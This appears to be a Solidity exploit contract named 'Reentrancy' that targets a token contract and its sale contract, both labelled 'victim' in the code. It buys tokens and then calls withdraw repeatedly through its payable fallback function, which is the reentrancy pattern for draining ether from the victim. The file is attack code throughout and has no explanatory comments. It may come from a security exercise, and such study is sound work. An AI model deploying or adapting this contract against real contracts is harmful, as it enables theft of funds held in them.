pragma solidity ^0.4.22;

import "./DVCToken.sol";
import "./DVCTokenSale.sol";

contract Reentrancy {

    uint256 private tokens = 1;
    uint256 private value = tokens * 1000000000000000000;
    DVCToken public victim;
    DVCTokenSale public victimSale;

    constructor() payable {}

    function setVictimsAddresses(address _addressVictim, address _addressVictimSale) public {
        victim = DVCToken(_addressVictim);
        victimSale = DVCTokenSale(_addressVictimSale);
    }

    function buy() {
        victimSale.buyTokens.value(value)(tokens);
    }

    function doExploit() public {
        victim.withdraw(this, tokens, value);
    }

    function() public payable {
        victim.withdraw(this, tokens, value);
    }
}